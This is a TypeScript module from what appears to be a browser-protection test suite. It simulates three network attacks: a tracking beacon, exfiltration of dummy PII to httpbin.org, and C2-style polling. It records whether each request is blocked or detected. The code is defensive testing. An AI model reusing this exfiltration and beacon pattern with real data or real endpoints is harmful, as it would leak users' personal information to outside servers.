import type { AttackResult, AttackTest } from "../types";
import { withDetectionMonitor } from "./detection-listener";

async function simulateBeaconCore(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    const response = await fetch("https://httpbin.org/post", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "tracking_beacon",
        timestamp: Date.now(),
        userAgent: navigator.userAgent,
      }),
    });

    const executionTime = performance.now() - startTime;

    return {
      blocked: false,
      detected: false,
      executionTime,
      details: `Beacon sent successfully (status: ${response.status})`,
    };
  } catch (error) {
    const executionTime = performance.now() - startTime;
    const errorMessage = error instanceof Error ? error.message : String(error);

    return {
      blocked: errorMessage.includes("blocked") || errorMessage.includes("ERR_BLOCKED"),
      detected: true,
      executionTime,
      details: `Request failed: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

const simulateBeacon = withDetectionMonitor(
  simulateBeaconCore,
  ["__TRACKING_BEACON_DETECTED__"]
);

async function simulateDataExfiltrationCore(): Promise<AttackResult> {
  const startTime = performance.now();

  const sensitiveData = {
    email: "test@example.com",
    creditCard: "4111-1111-1111-1111",
    ssn: "123-45-6789",
    password: "password123",
    timestamp: Date.now(),
  };

  try {
    const response = await fetch("https://httpbin.org/post", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(sensitiveData),
    });

    const executionTime = performance.now() - startTime;

    return {
      blocked: false,
      detected: false,
      executionTime,
      details: `Data exfiltration simulated (status: ${response.status})`,
    };
  } catch (error) {
    const executionTime = performance.now() - startTime;
    const errorMessage = error instanceof Error ? error.message : String(error);

    return {
      blocked: true,
      detected: true,
      executionTime,
      details: `Data exfiltration blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

const simulateDataExfiltration = withDetectionMonitor(
  simulateDataExfiltrationCore,
  ["__DATA_EXFILTRATION_DETECTED__"]
);

async function simulateC2CommunicationCore(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    const response = await fetch("https://jsonplaceholder.typicode.com/posts/1");
    const data = await response.json();

    const executionTime = performance.now() - startTime;

    return {
      blocked: false,
      detected: false,
      executionTime,
      details: `C2 polling successful, received ${JSON.stringify(data).length} bytes`,
    };
  } catch (error) {
    const executionTime = performance.now() - startTime;
    const errorMessage = error instanceof Error ? error.message : String(error);

    return {
      blocked: true,
      detected: true,
      executionTime,
      details: `C2 communication blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

// C2 Communication is harder to detect specifically, use network request monitoring
const simulateC2Communication = simulateC2CommunicationCore;

export const networkAttacks: AttackTest[] = [
  {
    id: "network-beacon",
    name: "Tracking Beacon",
    category: "network",
    description: "Sends a tracking beacon to an external server with user info",
    severity: "high",
    simulate: simulateBeacon,
  },
  {
    id: "network-exfiltration",
    name: "Data Exfiltration",
    category: "network",
    description: "Attempts to send sensitive data (PII) to an external server",
    severity: "critical",
    simulate: simulateDataExfiltration,
  },
  {
    id: "network-c2",
    name: "C2 Communication",
    category: "network",
    description: "Simulates command-and-control server polling",
    severity: "critical",
    simulate: simulateC2Communication,
  },
];
